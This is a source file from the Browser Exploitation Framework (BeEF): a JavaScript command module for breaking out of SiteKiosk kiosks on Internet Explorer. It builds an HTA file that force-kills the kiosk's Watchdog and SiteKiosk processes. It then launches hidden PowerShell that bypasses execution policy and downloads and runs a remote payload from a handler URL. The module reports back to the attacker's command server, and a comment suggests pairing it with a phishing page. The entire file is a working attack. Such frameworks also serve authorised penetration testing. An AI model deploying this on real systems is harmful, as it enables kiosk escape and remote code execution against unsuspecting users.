//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    if(beef.browser.isIE()){
        // application='yes' is IE-only and needed to load the HTA into an IFrame.
        // in this way you can have your phishing page, and load the HTA on top of it
        // beef.dom.createIframe('hidden', {'src':hta_url,'application':'yes'});
	bb = new MSBlobBuilder();
	bb.append('<script>new ActiveXObject("WScript.Shell").Run(\'taskkill.exe /F /IM Watchdog.exe\');<\/script>');
	bb.append('<script>new ActiveXObject("WScript.Shell").Run(\'taskkill.exe /F /IM SiteKiosk.exe\');<\/script>');
	bb.append('<script>new ActiveXObject("WScript.Shell").Run(\'powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring(\\\\\\"<%= @payload_handler %>\\\\\\"))"\');<\/script>');
	window.navigator.msSaveOrOpenBlob(bb.getBlob(),"BREAKOUT.hta");
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'HTA loaded into hidden IFrame.');
    }
});
